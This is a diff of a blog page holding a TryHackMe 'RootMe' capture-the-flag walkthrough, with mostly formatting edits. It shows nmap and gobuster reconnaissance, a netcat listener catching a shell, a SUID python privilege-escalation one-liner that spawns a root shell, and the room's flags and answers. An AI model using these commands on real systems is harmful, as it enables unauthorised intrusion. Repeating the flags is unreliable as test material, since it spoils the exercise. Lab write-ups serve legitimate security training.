@@ -79,7 +79,7 @@
     <div class="header__logo">
       <a href="/">
   <div class="logo">
-    S3c-bl0gs and Writeups
+    Writeups
   </div>
 </a>
 
@@ -262,11 +262,11 @@ Now do the nmap scan.</p>
 <p>Run nmap scan to search which ports are open and much more. First create the nmap folder and Run the following command.<br>
 command:<code>mkdir nmap</code><br>
 command:<code>cd nmap</code><br>
-command:<code>nmap -sV -oN nmap/rootme 10.10.156.27</code>\</p>
+command:<code>nmap -sV -oN nmap/rootme 10.10.156.27</code></p>
 <p>command breakdown:</p>
 <ul>
-<li>-sV : Version Detection</li>
-<li>-oN : store the output into nmap folder</li>
+<li>-sV : Version Detection.</li>
+<li>-oN : store the output into nmap folder.</li>
 </ul>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e"># Nmap 7.94 scan initiated Wed Sep 27 23:49:49 2023 as: nmap -sV -oN nmap/rootm\
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">e 10.10.156.27
@@ -303,7 +303,7 @@ command:<code>nmap -sV -oN nmap/rootme 10.10.156.27</code>\</p>
 </li>
 </ol>
 <h1 id="finding-hidden-directories">Finding hidden directories<a href="#finding-hidden-directories" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
-<p>So there may be some hidden directories, we are going to use gobuster tool for that. Run the following command.
+<p>So there may be some hidden directories, we are going to use gobuster tool for that. Run the following command.<br>
 command:<code>gobuster dir -u http://10.10.156.27/ -w /home//sumit/ctf/directory-list-2.3-medium.txt</code></p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">┌──</span>(sumit<span style="color:#960050;background-color:#1e0010">㉿</span>mr<span style="color:#f92672">-</span>nob0dy)<span style="color:#f92672">-</span>[<span style="color:#f92672">~/</span>ctf<span style="color:#f92672">/</span>tryhackme]
 </span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">└─$</span> gobuster dir <span style="color:#f92672">-</span>u http:<span style="color:#75715e">//10.10.156.27/ -w /home//sumit/ctf/directory-list-2.3-medium.txt
@@ -376,7 +376,7 @@ command:<code>nc -lvnp 4444</code></p>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>sh: <span style="color:#ae81ff">0</span><span style="color:#f92672">:</span> can<span style="color:#960050;background-color:#1e0010">&#39;</span>t access tty; job control turned off
 </span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span> 
 </span></span></code></pre></div><p>We get the shell access, now gothrough the all files and folders. try to find user.txt run the following command.<br>
-command:<code>find -type f -name user.txt</code>\</p>
+command:<code>find -type f -name user.txt</code></p>
 
 <img src="../flag1.png"  alt="home page"  class="center"  style="border-radius: 8px;"    />
 
@@ -384,14 +384,14 @@ command:<code>find -type f -name user.txt</code>\</p>
 <p>Run:<br>
 command:<code>cd var/www</code><br>
 command:<code>ls</code><br>
-command:<code>cat user.txt</code>\</p>
-<p>We got our first flag:
-<code>THM{y0u_g0t_a_sh3ll}</code></p>
+command:<code>cat user.txt</code></p>
+<p>We got our first flag.<br>
+Flag:<code>THM{y0u_g0t_a_sh3ll}</code></p>
 <h1 id="-task-4-privilege-escalation"># Task 4 Privilege escalation<a href="#-task-4-privilege-escalation" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
 <h1 id="privilege-escalation">Privilege Escalation<a href="#privilege-escalation" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
 <p>Now that we have a shell, let&rsquo;s escalate our privileges to root.<br>
 From hint run the following command to search a file with SUID permission and we got the file with the name python.<br>
-command:<code>find / -user root -perm /4000</code>\</p>
+command:<code>find / -user root -perm /4000</code></p>
 <p>We have a shell but it is not stable. From hint do some research on GTFOBins, Google it. Search for python in gtfobins go the SUID section we got the command.</p>
 
 <img src="../gtfobin.png"  alt="home page"  class="center"  style="border-radius: 8px;"    />
@@ -400,7 +400,7 @@ command:<code>find / -user root -perm /4000</code>\</p>
 <p>command:<code>python -c 'import os; os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-p&quot;)'</code><br>
 command:<code>cd root</code><br>
 command:<code>ls</code><br>
-command:<code>cat root.txt</code>\</p>
+command:<code>cat root.txt</code></p>
 <p>By running the above command we get the root access or a stable shell now try to access <code>root.txt</code> file.
 we got our 2nd flag&hellip;.
 flag:<code>THM{pr1v1l3g3_3sc4l4t10n}</code></p>
@@ -408,14 +408,14 @@ flag:<code>THM{pr1v1l3g3_3sc4l4t10n}</code></p>
 <ol>
 <li>
 <p>Search for files with SUID permission, which file is weird?<br>
-<code>ans: /usr/bin/python</code>\</p>
+<code>ans: /usr/bin/python</code></p>
 </li>
 <li>
 <p>Find a form to escalate your privileges.<br>
 <code>ans: no answer needed</code></p>
 </li>
 <li>
-<p>root.txt
+<p>root.txt<br>
 <code>ans: THM{pr1v1l3g3_3sc4l4t10n}</code></p>
 </li>
 </ol>
